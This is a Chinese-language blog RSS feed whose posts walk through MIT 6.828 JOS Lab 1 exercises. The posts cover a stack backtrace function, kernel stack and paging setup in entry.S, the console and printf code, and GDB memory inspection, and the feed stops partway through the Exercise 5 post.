<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>C7</title>
    <link>https://billyotry.github.io/</link>
    
    <atom:link href="/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>雖不能至 心嚮往之</description>
    <pubDate>Sun, 28 Feb 2021 13:21:57 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>这是标题</title>
      <link>https://billyotry.github.io/2099/01/01/test/</link>
      <guid>https://billyotry.github.io/2099/01/01/test/</guid>
      <pubDate>Wed, 31 Dec 2098 16:00:00 GMT</pubDate>
      <description>
      
        
        
          &lt;p&gt;&lt;strong&gt;just a test&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://inews.gtimg.com/newsapp_ls/0/13071917630/0&quot; alt=&quot;backgroud&quot;&gt;&lt;/p&gt;

        
      
      </description>
      
      
      <content:encoded><![CDATA[<p><strong>just a test</strong></p><p> <img src="https://inews.gtimg.com/newsapp_ls/0/13071917630/0" alt="backgroud"></p>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2099/01/01/test/#disqus_thread</comments>
    </item>
    
    <item>
      <title>【MIT6.828】Lab1-Exercise11</title>
      <link>https://billyotry.github.io/2021/02/28/%E3%80%90MIT6.828%E3%80%91Lab1-Exercise11/</link>
      <guid>https://billyotry.github.io/2021/02/28/%E3%80%90MIT6.828%E3%80%91Lab1-Exercise11/</guid>
      <pubDate>Sun, 28 Feb 2021 13:13:11 GMT</pubDate>
      <description>
      
        
        
          &lt;h2 id=&quot;任务&quot;&gt;&lt;a href=&quot;#任务&quot; class=&quot;headerlink&quot; title=&quot;任务&quot;&gt;&lt;/a&gt;任务&lt;/h2&gt;&lt;p&gt;完成&lt;code&gt;mon_backtrace()&lt;/code&gt;函数&lt;/p&gt;
&lt;h2 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h2 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h2><p>完成<code>mon_backtrace()</code>函数</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>我们可以利用课程提供给我们的<code>read_ebp()</code>函数来获取此时的ebp，不过要注意的是他返回的是<code>int</code>类型，接下来就是简单的指针操作了。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">mon_backtrace(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, struct Trapframe *tf)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span>* ebp = (<span class="keyword">int</span> *)read_ebp();</span><br><span class="line">    cprintf(<span class="string">&quot;Stack backtrace:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(ebp)&#123;</span><br><span class="line">        cprintf(<span class="string">&quot;  ebp %08x&quot;</span>,ebp);</span><br><span class="line">        cprintf(<span class="string">&quot;  eip %08x&quot;</span>,*(ebp+<span class="number">1</span>));</span><br><span class="line">        cprintf(<span class="string">&quot;  args&quot;</span>);</span><br><span class="line">        cprintf(<span class="string">&quot; %08x&quot;</span>,*(ebp+<span class="number">2</span>));</span><br><span class="line">        cprintf(<span class="string">&quot; %08x&quot;</span>,*(ebp+<span class="number">3</span>));</span><br><span class="line">        cprintf(<span class="string">&quot; %08x&quot;</span>,*(ebp+<span class="number">4</span>));</span><br><span class="line">        cprintf(<span class="string">&quot; %08x&quot;</span>,*(ebp+<span class="number">5</span>));</span><br><span class="line">        cprintf(<span class="string">&quot; %08x\n&quot;</span>,*(ebp+<span class="number">6</span>));</span><br><span class="line">        ebp = (<span class="keyword">int</span>*) *ebp;</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果图如下：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13223233811/0" alt="image-20210228211804240"></p>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2021/02/28/%E3%80%90MIT6.828%E3%80%91Lab1-Exercise11/#disqus_thread</comments>
    </item>
    
    <item>
      <title>【MIT6.828】Lab1-Exercise9</title>
      <link>https://billyotry.github.io/2021/02/03/%E3%80%90MIT6.828%E3%80%91Lab1-Exercise9/</link>
      <guid>https://billyotry.github.io/2021/02/03/%E3%80%90MIT6.828%E3%80%91Lab1-Exercise9/</guid>
      <pubDate>Wed, 03 Feb 2021 13:01:28 GMT</pubDate>
      <description>
      
        
        
          &lt;h2 id=&quot;任务&quot;&gt;&lt;a href=&quot;#任务&quot; class=&quot;headerlink&quot; title=&quot;任务&quot;&gt;&lt;/a&gt;任务&lt;/h2&gt;&lt;p&gt;判断一下操作系统内核是从哪条指令开始初始化它的堆栈空间的，以及这个堆栈坐落在内存的哪个地方？内核是如何给它的堆栈保留一块内存空间的？堆栈指针
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h2 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h2><p>判断一下操作系统内核是从哪条指令开始初始化它的堆栈空间的，以及这个堆栈坐落在内存的哪个地方？内核是如何给它的堆栈保留一块内存空间的？堆栈指针又是指向这块被保留的区域的哪一端的呢？</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="1-首先判断操作系统内核是从哪条指令开始初始化它的堆栈空间"><a href="#1-首先判断操作系统内核是从哪条指令开始初始化它的堆栈空间" class="headerlink" title="1.首先判断操作系统内核是从哪条指令开始初始化它的堆栈空间"></a>1.首先判断操作系统内核是从哪条指令开始初始化它的堆栈空间</h3><p>前面以及分析过boot.S和main.c文件的运行过程，这个文件中的代码是PC启动后，BIOS运行完成后，首先执行的两部分代码。但是它们并不属于操作系统的内核。当main.c的最后一条指令讲处理器的控制权交给entry.S时，此时才真正进入操作系统内核。其实我们能发现，在进入entry之前，并没有对于%esp，%ebp寄存器的内容的修改，所以在bootmain中并没有初始化堆栈空间的语句。</p><p>下面进入entry.S，在entry.S中我们可以看到它最后一条指令是要调用i386_init()子程序。这个子程序位于init.c文件之中。在这个程序中已经开始对操作系统进行一些初始化工作，并且自重进入mointor函数。可见到i386_init子程序时，内核的堆栈应该已经设置好了。<strong>所以设置内核堆栈的指令就应该是entry.S中位于 call i386_init 指令之前的两条语句：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">movl$0x0,%ebp# nuke frame pointer</span><br><span class="line">movl$(bootstacktop),%esp # Set the stack pointer</span><br></pre></td></tr></table></figure><p>这两条指令修改了%ebp，%esp两个寄存器的值，而这两个寄存器的值和堆栈息息相关。</p><h3 id="2-这个堆栈坐落在内存的什么地方"><a href="#2-这个堆栈坐落在内存的什么地方" class="headerlink" title="2.这个堆栈坐落在内存的什么地方"></a>2.这个堆栈坐落在内存的什么地方</h3><p>首先我们好好分析以下entry.S。</p><p>首先我们配置好一个qemu，gdb调试环境，现在我们首先在gdb中设置一个断点（指令: b *0x7d6b），就设置到马上进入entry之前，然后一步步进行调试。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13129479702/0" alt="image-20210203215417909"></p><p>当我们准备运行entry.S中第一条指令 movx $0x1234, 0x472 时，指令地址是0x10000C，如上图所示。这个比较好理解，因为在bootmain里面，我们已经把操作系统的内核文件全部加载到物理内存0x100000处了。所以0x10000C是系统内核的第一条指令所在的物理地址处。而当我们继续运行运行到jmp *%eax之后，后面的指令地址就都变化了，变换为：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13129481847/0" alt="image-20210203215451095"></p><p>图中的地址是0xf010002f，很明显这是一个虚拟地址，它的真实地址应该是0x0010002f，因为所有的内核代码都实际存放在这个内存区域中。之所以现在要把指令地址设置为0xf010002f，即把操作系统的代码的虚拟地址设置为从0xf0100000开始。目的就是能够让程序员在编程时，能够利用虚拟地址空间的低地址空间。如果它编写的程序调用了操作系统的代码，则操作系统代码的虚拟地址一定位于高地址空间0xf0100000处。这样非常有利于程序员写程序。</p><p>　　所以必须有一种机制能够实现，即便程序员在程序中指定的操作系统的代码的虚拟地址在0xf0100000高地址空间，但是我们这个机制也能够把这个高地址转换为这个代码真实的在内存中的位置。比如上图中，我们想访问0xf010002f处的指令，这是个虚拟地址，当实际运行时，会有一种机制把这个地址转换为真实地址0x0010002f。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 　　movl    $(RELOC(entry_pgdir)), %eax</span><br><span class="line">2 　　movl    %eax, %cr3</span><br><span class="line">3 　　movl    %cr0, %eax</span><br><span class="line">4 　　orl    $(CR0_PE|CR0_PG|CR0_WP), %eax</span><br><span class="line">5 　　movl    %eax, %cr0</span><br></pre></td></tr></table></figure><p>这个机制的实现方式是通过写一个C语言的页表，enrty_pgdir，这个手写的页表可以自动把[0xf0000000-0xf0400000]这4MB的虚拟地址空间映射为[0x00000000-0x00400000]的物理地址空间。可见这个页表的映射能力还是比较有限的，只能映射一个区域。对于当前执行的这些指令，这个映射空间就已经足够了。因为当前运行的是内核程序，他们的虚拟空间地址范围在[0xf0000000-0xf0400000]之内。但是当操作系统真正正常的运行起来的时候，这个映射就不够用了。必须采用更全面的，也就是在lab 2中要介绍的页表机制。所以当操作系统真正正常运行起来时，entry_pgdir这个页表将不会再使用。</p><p>首先第1句讲entry_pgdir这个页表的起始物理地址送给%eax，这里RELOC宏的功能是计算输入参数的物理地址。第2句将entry_pgdir这个页表的起始物理地址送给%cr3寄存器。控制寄存器cr2和cr3都是和分页机制相关的寄存器。其中cr3寄存器存放页表的物理起始地址。第3~5句，修改cr0寄存器的值，<strong>把cr0的PE位，PG位, WP位都置位1。其中PE位是启用保护标识位，如果被置1代表将会运行在保护模式下。PG位是分页标识位，如果这一位被置1，则代表开启了分页机制。WP位是写保护标识，如果被置位为1，则处理器会禁止超级用户程序向用户级只读页面执行写操作</strong>。</p><p>这条指令过后，就开始工作在具有分页机制的模式之下了。接下来的指令就可以指定[0xf0000000-0xf0400000]范围的指令了。</p><p>然后下面两条指令就把当前运行程序的地址空间提高到[0xf0000000-0xf0400000]范围内。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1     mov    $relocated, %eax</span><br><span class="line">2     jmp    *%eax</span><br></pre></td></tr></table></figure><p><img src="https://inews.gtimg.com/newsapp_ls/0/13129512736/0" alt="image-20210203220213503"></p><p>可见relocated的值为0xf010002f。此时分页系统会把这个虚拟地址，转换为真实的物理地址。</p><p>接下来就是最关键的两句：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1     movl    $0x0,%ebp            # nuke frame pointer</span><br><span class="line">2     movl    $(bootstacktop),%esp # Set the stack pointer</span><br><span class="line">3     call    i386_init</span><br></pre></td></tr></table></figure><p>这两个指令分别设置了%ebp，%esp两个寄存器的值。其中%ebp被修改为0。%esp则被修改为bootstacktop的值。这个值为0xf0110000。另外在entry.S的末尾还定义了一个值，bootstack。注意，在数据段中定义栈顶bootstacktop之前，首先分配了KSTKSIZE这么多的存储空间，专门用于堆栈，这个KSTKSIZE = 8 * PGSIZE = 8 * 4096 = 32KB。<strong>所以用于堆栈的地址空间为 0xf0108000-0xf0110000，其中栈顶指针指向0xf0110000. 那么这个堆栈实际坐落在内存的 0x00108000-0x00110000物理地址空间中。</strong></p><h3 id="3-内核是如何给它的堆栈保留一块空间的"><a href="#3-内核是如何给它的堆栈保留一块空间的" class="headerlink" title="3.内核是如何给它的堆栈保留一块空间的"></a>3.内核是如何给它的堆栈保留一块空间的</h3><p>其实就是通过刚刚分析的，在entry.S中的数据段里面声明一块大小为32Kb的空间作为堆栈使用。从而为内核保留了一块空间。</p><h3 id="4-堆栈指针又是如何指向被保留的区域的哪一端的呢"><a href="#4-堆栈指针又是如何指向被保留的区域的哪一端的呢" class="headerlink" title="4.堆栈指针又是如何指向被保留的区域的哪一端的呢"></a>4.堆栈指针又是如何指向被保留的区域的哪一端的呢</h3><p>堆栈由于是由高到低生长的，所以堆栈指针自然要指向最高地址了。最高地址就是我们之前看到的bootstacktop的值。所以将会把这个值赋给堆栈指针寄存器。</p>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2021/02/03/%E3%80%90MIT6.828%E3%80%91Lab1-Exercise9/#disqus_thread</comments>
    </item>
    
    <item>
      <title>【MIT6.828】Lab1-Exercise8</title>
      <link>https://billyotry.github.io/2021/02/02/%E3%80%90MIT6.828%E3%80%91Lab1-Exercise8/</link>
      <guid>https://billyotry.github.io/2021/02/02/%E3%80%90MIT6.828%E3%80%91Lab1-Exercise8/</guid>
      <pubDate>Tue, 02 Feb 2021 09:34:23 GMT</pubDate>
      <description>
      
        
        
          &lt;h2 id=&quot;任务&quot;&gt;&lt;a href=&quot;#任务&quot; class=&quot;headerlink&quot; title=&quot;任务&quot;&gt;&lt;/a&gt;任务&lt;/h2&gt;&lt;p&gt;我们丢弃了一小部分代码—即当我们在printf中指定输出”%o”格式的字符串，即八进制格式的代码。尝试去完成这部分程序。&lt;/p&gt;
&lt;h2 i
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h2 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h2><p>我们丢弃了一小部分代码—即当我们在printf中指定输出”%o”格式的字符串，即八进制格式的代码。尝试去完成这部分程序。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>在这个练习中我们首先要阅读三个源文件之间的代码，弄清楚他们三者之间的关系。他们是<code>/kern/printf.c，/kern/console.c, /lib/printfmt.c</code></p><p>首先大致浏览三个源文件，大致观察到：</p><ol><li>printf.c中的cprintf调用了vcprintf，然后vcprintf调用了printffmt.c中的vprintfmt。</li><li>printf.c中的putch调用了console.c中的cputchar，cputchar调用了cons_putc。</li><li>printfmt.c中的某些程序也依赖于cputchar。</li></ol><p>所以printf.C，printfmt.c的功能依赖于console.c的功能。所以我们先探讨下console.c。</p><h3 id="kern-console-c"><a href="#kern-console-c" class="headerlink" title="/kern/console.c"></a>/kern/console.c</h3><p>这个文件中定义了把一个字符显示到console上，即我们的显示屏上，里面包括了很多对IO端口的操作。</p><p>其中我们最感兴趣的<code>cputchar</code>函数。从注释中我们知道这个是最高处的console的IO控制程序，<code>cputchar</code>的实现其实是通过调用<code>cons_putc</code>实现的。</p><p><code>cons_putc</code>的功能是输出一个字符到控制台（计算机的屏幕），所以<code>cputchar</code>的功能也是想屏幕上输出一个字符。然后我们具体看下<code>cons_putc</code>函数，<code>cons_putc</code>包含三个函数。</p><p>首先是<code>serial_putc</code>函数：其中包括了一些IO端口程序，通过代码的宏定义我们知道他是在控制0x3f8端口，这个端口在我们之前的网站中可以查到，它是属于控制计算机中的串口。我们在观察一下函数中的inb指令和outb指令，他们分别控制两个端口，<code>COM1+COM_LSR = 0x3f8 + 5 = 0x3fd</code>和 <code>COM1 + COM_TX = 0x3f8 + 0 = 0x3f8</code>端口。inb指令是读取<code>0x3fd</code>端口，即line status registers的内容，并且判断它的bit5是否为1，即发送数据缓冲区寄存器是否为空。如果为空，则计算机可以发送下一个数据给端口。而outb指令则是把要发送的数据c，发送给<code>0x3f8</code>，当<code>0x3f8</code>端口被写入值时，它是作为发送数据缓冲寄存器的，里面存放要发送给串口的数据。所以<code>serial_putc</code>函数的功能是把一个字符输出给串口。至于为什么，不知道。</p><p>然后是<code>lpt_putc</code>函数：把字符输出给并口设备。至于为什么，不知道。</p><p>接着是<code>cga_putc</code>函数：把字符输出到cga设备上，即计算机的显示屏。它首先定义了一个缓冲区，缓冲区的当前显示内容的最后一个字符的指针就是crt_pos，所以当你新输入一个字符时，你必须根据字符值的值，来输出正确的内容给这个缓冲区，然后缓冲区的内容才能正确的显示在屏幕上。比如当第8行当c为’\b’时，代表是输入了退格，所以此时要把缓冲区最后一个字节的指针减一，相当于丢弃当前最后一个输入的字符。当c为’\t’时，我要输出5个空格给缓冲区。如果不是特殊字符，那么就把字符的内容直接输入到缓冲区。而switch之后的if判断语句的功能应该是保证缓冲区中的最后显示出去的内容的大小不要超过显示的大小的界限。最后四句则是把缓冲区的内容输出给显示屏。</p><h3 id="lib-printfmt-c"><a href="#lib-printfmt-c" class="headerlink" title="/lib/printfmt.c"></a>/lib/printfmt.c</h3><p>首先看一下文件开头的注释。</p><p>“打印各种样式的字符串的函数，经常被printf，sprintf，fprintf函数所调用，这些代码是同时被内核和用户程序所使用的”通过注释，我们知道这个文件中定义的子程序是我们能在编程时直接利用printf函数想屏幕输出信息的关键。那么我们把目光锁定到被其他文件以来的<code>vprintfmt</code>子程序。程序包含四个参数：</p><ol><li><p><code>void (*putch)(int, void*)</code>：这个参数是一个函数指针，这类函数包含两个输入参数int，void*，int代表一个要输出的字符的值，void *则代表要把这个字符输出的位置的地址，但是这里void *参数的值并不是这个这个地址，而是存放这个地址的存储单元的地址。比如我想把一个字符值为0x30的字符（’0’）输出到地址0x01处，此时我们的程序应该是：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">int</span> addr = <span class="number">0x01</span>; </span><br><span class="line"><span class="number">2</span> <span class="keyword">int</span> ch = <span class="number">0x30</span>;</span><br><span class="line"><span class="number">3</span> putch(ch, &amp;addr);</span><br></pre></td></tr></table></figure></li><li><p><code>void *putdat</code>：这个参数就是输入的字符要存放的内存地址的指针，就是和上面putch函数的第二个参数一个含义。</p></li><li><p><code>const char *fmt</code>：这个参数代表你在编写类似于printf这种格式化输出程序时，你指定的格式的字符串，即printf函数的第一个输入参数，比如printf(“This is %d test”, n)，这个子程序中，fmt就是”This is %d test”。</p></li><li><p><code>va_list ap</code>：这个参数代表的是多个输入参数，即printf子程序中从第二个参数开始之后的参数，比如(“These are %d test and %d test”, n, m)，那么ap指的就是n，m。</p></li></ol><p>那么这个函数的执行过程主要是一个while循环，分为以下几个步骤：</p><ol><li><p>（92 ~ 96行）首先一个个的输出格式化字符串fmt中所有’%’之前的字符，因为它们就是要直接输出的，比如”This is %d test”中的”This is “。当然如果在把这些字符一个个输出中遇到结束符’\0’，则结束输出。</p></li><li><p>（98 ~ 243行）剩余的代码都是在处理’%’符号后面的格式化输出，比如是%d，则按照十进制输出对应参数。另外还有一些其他的特殊字符比如’%5d’代表显示5位，其中的5要特殊处理。而这个程序也是正是这个练习让我们补充的地方，在源程序的第207行~212行，这里是要处理显示八进制的格式的时候的代码：</p><p>　　我们可以参照上面显示无符号十进制的情况’u’，或者十六进制的’x’，来书写八进制的，具体原理可以看上面代码的备注，我填写代码如下：</p></li></ol><p>注：这个子程序里面涉及到一个非常重要的子函数va_arg()，其实与这个函数类似的还有2个，va_start()，va_end()，以及一个数据类型va_list。这个4个东西是为了计算机能够处理输入参数不固定的程序。比如下面这种程序的声明方式</p><p>　　　　　void fun(int arg_num, …)</p><p>其中arg_num，代表这个程序输入参数的个数(不包含arg_num本身)，而后面的省略号则指代后续所有的输入参数，我们可以在程序中调用，如下</p><p>　　　　　fun(3, 10, 20, 30)；</p><p>　　 这种能够处理可变个数输入参数的功能就是由va_list, va_arg(), va_start(), va_end()来实现的。可以参考</p><p><a href="http://www.cnblogs.com/justinzhang/archive/2011/09/29/2195969.html。">http://www.cnblogs.com/justinzhang/archive/2011/09/29/2195969.html。</a></p><h3 id="kern-printf-c"><a href="#kern-printf-c" class="headerlink" title="/kern/printf.c"></a>/kern/printf.c</h3><p>这个文件中定义了我们在编程中会用到的最顶层的一些格式化输出子程序，比如printf，sprintf等。</p><p>首先看一下最下面的cprintf子程序，它的输入是最接近于我们在编程中使用格式化输出子程序时的输入了，比如printf(“This is %d test”, n)，第一个参数为输出的格式字符串，而后面就是我要输出的一些参数。它是如何实现的呢，我们在它的内部看到a_list，va_arg(), va_start(), va_end()这组操作的使用，前面我们说过，它们是专门用来处理这种输入参数的个数不确定的情况。在cprintf中我们发现，它利用va_list，va_arg()，va_start()，va_end()这些操作，把cprintf的fmt之后的输入参数都转化为va_list类型的一个参数，然后把fmt，和这个新生成的ap作为参数传递给vcprintf。</p><p>在vcprintf中我们发现，它就是调用了我们在上面仔细分析过的vprintfmt子程序，回顾一下，介绍vprintfmt子程序时，我们说过它有4个参数，如下</p><ol><li><code>void (*putch)(int, void*)</code>：这个参数是一个函数指针，这类函数包含两个输入参数int, void *，int参数代表一个要输出的字符的值。void * 则代表要把这个字符输出的位置的地址。</li><li><code>void *putdat</code>：这个参数就是输入的字符要存放在的内存地址的指针，就是和上面putch函数的第二个输入参数是一个含义。</li><li><code>const char *fmt</code>：这个参数代表你在编写类似于printf这种格式化输出程序时，你指定格式的字符串，即printf函数的第一个输入参数，比如printf(“This is %d test”, n)，这个子程序中，fmt就是”This is %d test”。</li><li><code>va_list ap</code>：这个参数代表的是多个输入参数，即printf子程序中从第二个参数开始之后的参数，比如(“These are %d test and %d test”, n, m)，那么ap指的就是n，m。</li></ol><p>我们可以发现，刚刚得到的fmt和ap正好可以被放在第3和第4个输入参数处！</p><p>另外再看头两个参数，第一个参数是一个函数指针，这个函数必须能够实现把一个字符输出到某个地址处的功能。再看一下vcprintf中它赋给vprintfmt子程序的第一个参数是这个文件中的第一个子程序putch。</p><p>它调用了我们最开始分析的子程序，cputchar，这个子程序可以把字符输出到屏幕上。所以这个putch子程序是满足vprintfmt子程序的要求的~可以作为参数传递给它。最后再看第二个参数，这个参数在这里就不具备内存地址的含义了，我们看到在putch里面，它只是把字符输出给屏幕，然后把这个cnt加1，并没有把字符存放到cnt所指向的地址处，所以这个cnt就变成了一个计数器。记录已经输出了多少的字符。</p>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2021/02/02/%E3%80%90MIT6.828%E3%80%91Lab1-Exercise8/#disqus_thread</comments>
    </item>
    
    <item>
      <title>【MIT6.828】Lab1-Exercise7</title>
      <link>https://billyotry.github.io/2021/02/01/%E3%80%90MIT6.828%E3%80%91Lab1-Exercise7/</link>
      <guid>https://billyotry.github.io/2021/02/01/%E3%80%90MIT6.828%E3%80%91Lab1-Exercise7/</guid>
      <pubDate>Mon, 01 Feb 2021 03:29:34 GMT</pubDate>
      <description>
      
        
        
          &lt;h2 id=&quot;任务&quot;&gt;&lt;a href=&quot;#任务&quot; class=&quot;headerlink&quot; title=&quot;任务&quot;&gt;&lt;/a&gt;任务&lt;/h2&gt;&lt;p&gt;使用Qemu和GDB去追踪JOS内核文件，并且停止在movl %eax, %cr0指令前。此时看一下内存地址0x00100000以及0xf0
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h2 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h2><p>使用Qemu和GDB去追踪JOS内核文件，并且停止在movl %eax, %cr0指令前。此时看一下内存地址0x00100000以及0xf0100000处分别存放着什么。然后使用stepi命令执行完这条命令，再次检查这两个地址处的内容。确保你真的理解了发生了什么。如果这条指令movl %eax, %cr0并没有执行，而是被跳过，那么第一个会出现问题的指令是什么？我们可以通过把entry.S的这条语句加上注释来验证一下。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>首先我们断点到0x10000C处，因为我们在之前的练习中已经知道了，0x10000C是内核文件的入口地址。然后我们从这条指令开始一步步运行，直到碰到<code>movl %eax, %cr0</code>指令。在这条指令运行之前，地址0x00100000和地址0xf0100000两处存储的内容是：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13117156842/0" alt="image-20210201113700194"></p><p>可见两地址处的值是不一样的。</p><p>当执行完<code>movl %eax, %cr0</code>后，在查看两个位置：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13117174931/0" alt="image-20210201114135742"></p><p>我们会发现两处存放的值已经一样了！ 可见原本存放在0xf0100000处的内容，已经被映射到0x00100000处了。</p><p>第二问需要我们把entry.S文件中的<code>%movl %eax, %cr0</code>这句话注释掉，重新编译内核。我们需要先make clean，然后把<code>%movl %eax, %cr0</code>这句话注释掉，重新编译。 再次用qemu仿真，并且设置断点到0x10000C处，开始一步步执行。通过一步步查询发现了出现错误的一句。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13117250200/0" alt="image-20210201115806186"></p><p>其中在0x10002a处的jmp指令，要跳转的位置是0xf010002C，由于没有进行分页管理，此时不会进行虚拟地址到物理地址的转化，所以报错。也就是说此时的虚拟地址就当成了物理地址，但是我们知道我们的物理地址肯定没有这么大的地方，所以报错了。下面是make qemu-gdb中的信息</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13117260785/0" alt="image-20210201120017641"></p><p>可见当前访问的逻辑地址超出内存。</p>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2021/02/01/%E3%80%90MIT6.828%E3%80%91Lab1-Exercise7/#disqus_thread</comments>
    </item>
    
    <item>
      <title>【MIT6.828】Lab1-Exercise6</title>
      <link>https://billyotry.github.io/2021/01/31/%E3%80%90MIT6.828%E3%80%91Lab1-Exercise6/</link>
      <guid>https://billyotry.github.io/2021/01/31/%E3%80%90MIT6.828%E3%80%91Lab1-Exercise6/</guid>
      <pubDate>Sun, 31 Jan 2021 01:35:16 GMT</pubDate>
      <description>
      
        
        
          &lt;h2 id=&quot;任务&quot;&gt;&lt;a href=&quot;#任务&quot; class=&quot;headerlink&quot; title=&quot;任务&quot;&gt;&lt;/a&gt;任务&lt;/h2&gt;&lt;p&gt;在这个练习中，我们将尝试使用GDB的x命令（查看内存命令）。 x/Nx ADDR。这个指令将打印出从ADDR地址开始之后的N个字的内容。重启
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h2 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h2><p>在这个练习中，我们将尝试使用GDB的x命令（查看内存命令）。 x/Nx ADDR。这个指令将打印出从ADDR地址开始之后的N个字的内容。重启一下Qemu。在Bios进入boot loader之前，内存地址0x00100000处8个字的内容，然后进入boot loader运行到内核开始处停止，再看下这个地址处的值。为什么二者不同？第二次这个内存处所存放的值的含义是什么？</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>在进入boot loader之前，从内存地址0x00100000处开始之后8个字的内容为：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13112362486/0" alt="image-20210131093712110"></p><p>在进入kernel那一刻之前，从内存地址0x00100000处开始之后8个字的内容为：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13112363411/0" alt="image-20210131093733615"></p><p>为什么会产生这种变化，因为bootmain函数在最后会把内核的各个程序段送入到内存地址0x00100000处，所以这里现在存放的就是内核的某一个段的内容，由于程序入口地址是0x0010000C，正好位于这个段中，所以可以推测，这里面存放的应该是指令段，即.text段的内容。</p>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2021/01/31/%E3%80%90MIT6.828%E3%80%91Lab1-Exercise6/#disqus_thread</comments>
    </item>
    
    <item>
      <title>【MIT6.828】Lab1-Exercise5</title>
      <link>https://billyotry.github.io/2021/01/30/%E3%80%90MIT6.828%E3%80%91Lab1-Exercise5/</link>
      <guid>https://billyotry.github.io/2021/01/30/%E3%80%90MIT6.828%E3%80%91Lab1-Exercise5/</guid>
      <pubDate>Sat, 30 Jan 2021 14:39:18 GMT</pubDate>
      <description>
      
        
        
          &lt;h2 id=&quot;任务&quot;&gt;&lt;a href=&quot;#任务&quot; class=&quot;headerlink&quot; title=&quot;任务&quot;&gt;&lt;/a&gt;任务&lt;/h2&gt;&lt;p&gt;再一次追踪一下boot loader的一开始几句指令，知道第一条满足如下条件的指令处：&lt;/p&gt;
&lt;p&gt;当我修改了boot loader的链接
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h2 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h2><p>再一次追踪一下boot loader的一开始几句指令，知道第一条满足如下条件的指令处：</p><p>当我修改了boot loader的链接地址，这个指令就会出现错误。</p><p>找到这样的指令后，把boot loader的链接地址修改一下，我们要在boot/Makefrag文件中修改它的链接地址，修改完成后运行 make clean， 然后通过make指令重新编译内核，再找到那条指令看看会发生什么。 最后别忘了改回来。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这道题希望我们修改boot loader的链接地址，在Lab 1中，作者引入了两个概念，一个是链接地址，一个是加载地址。链接地址可以理解为通过编译器链接器处理形成的可执行程序中指令的地址，即逻辑地址。加载地址则是可执行文件真正被装入内存后运行的地址，即物理地址。</p><p>那么在boot loader中，由于在boot loader运行时还没有任何的分段处理机制，或分页处理机制，所以boot loader可执行程序中的链接地址就应该等于加载地址。在Lab中作者说，BIOS默认把boot loader加载到0x7C00内存地址处，所以就要求boot loader的链接地址也要在0x7C00处。boot loader地址的设定是在boot/Makefrag中完成的，所以根据题目的要求，我们需要改动这个文件的值。</p><p>　　首先按照题目要求，在lab目录下输入make clean，清除掉之前编译出来的内核可执行文件，在清除之前你可以先把 obj/boot/boot.asm文件拷贝出来，之后可以用来比较。然后打开这个boot/Makefrag文件，我们会发现下列语句：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13112346066/0" alt="image-20210131093057268"></p><p>其中的-Ttext 0x7C00，就是指定链接地址，我们可以把它修改为0x7E00，然后保存退出。</p><p>　　然后在lab下输入make，重新编译内核，首先查看一下obj/boot/boot.asm，并且和之前的那个obj/boot/boot.asm文件做比较。下图是新编译出来的boot.asm：</p><p>由于BIOS会把boot loader程序默认装入到0x7c00处，所以我们还是再0x7C00处设置断点，并且运行到那里，我们发现前几条命令依旧是正常的，直到运行到<code>lgdtw 